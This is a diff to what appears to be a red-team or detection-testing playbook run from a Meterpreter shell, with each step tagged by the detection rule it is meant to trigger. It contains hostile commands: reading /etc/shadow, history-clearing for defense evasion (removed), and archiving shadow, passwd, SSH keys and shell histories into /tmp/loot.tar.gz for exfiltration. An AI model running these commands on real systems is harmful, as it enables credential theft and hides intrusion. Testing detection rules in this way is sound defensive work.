@@ -91,10 +91,8 @@ uname -a
 hostname
 cat /etc/passwd | grep -v nologin
 
-# System enumeration with getconf (triggers detection)
-getconf -a
-getconf LONG_BIT
-getconf PAGE_SIZE
+# Enumerate kernel modules (triggers Enumeration of Kernel Modules rule)
+lsmod
 
 exit
 ```
@@ -160,35 +158,17 @@ sudo cat /etc/shadow
 
 ---
 
-## Phase 7: Defense Evasion (run in Meterpreter shell)
-
-```bash
-sessions -i 1
-shell
-
-# Clear history (triggers detection)
-unset HISTFILE
-export HISTSIZE=0
-history -c
-
-exit
-```
-
----
-
-## Phase 8: Collection (run in Meterpreter shell)
+## Phase 7: Collection (run in Meterpreter shell)
 
 ```bash
 shell
 
-# Stage sensitive files
-mkdir /tmp/.staging
-find /home -name "*.pdf" -exec cp {} /tmp/.staging/ \; 2>/dev/null
-find /home -name "*.doc*" -exec cp {} /tmp/.staging/ \; 2>/dev/null
-find /etc -name "*.conf" -exec cp {} /tmp/.staging/ \; 2>/dev/null
+# Compress sensitive files for exfiltration (triggers Sensitive Files Compression rule)
+# The rule detects tar/zip/gzip with sensitive file paths in args
+sudo tar -czf /tmp/loot.tar.gz /etc/shadow /etc/passwd /home/*/.ssh/authorized_keys /home/*/.bash_history 2>/dev/null
 
-# Compress for exfiltration (triggers detection)
-tar -czf /tmp/data.tar.gz /tmp/.staging
+# Verify the archive was created
+ls -la /tmp/loot.tar.gz
 
 exit
 ```
